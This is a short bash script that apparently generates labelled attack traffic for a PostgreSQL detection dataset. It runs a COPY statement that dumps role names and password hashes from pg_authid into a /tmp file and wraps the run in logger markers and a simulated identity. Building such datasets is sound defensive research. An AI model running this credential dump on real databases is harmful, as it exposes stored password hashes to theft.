#!/bin/bash
# Template: SQLi COPY-based credential dump.
set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")"
source ./_identity_lib.sh
casce_new_identity

echo "Simulating SQL Injection Attack (attack_sqli_copy)... identity=${CASCE_USER}@${CASCE_IP}"
/dataset_workspace/logger.sh mark_attack "attack_sqli_copy" start

# Dump filename is derived from the run's identity so concurrent/repeated
# runs never clobber each other's output file.
DUMP_FILE="/tmp/sqli_dump_${CASCE_USER}.txt"
SQL_COMMANDS=(
  "COPY (SELECT rolname, rolpassword FROM pg_authid) TO '${DUMP_FILE}';"
)

for sql in "${SQL_COMMANDS[@]}"; do
  psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)${sql}"
  casce_random_delay 0.3 2.5
done

/dataset_workspace/logger.sh mark_attack "attack_sqli_copy" end
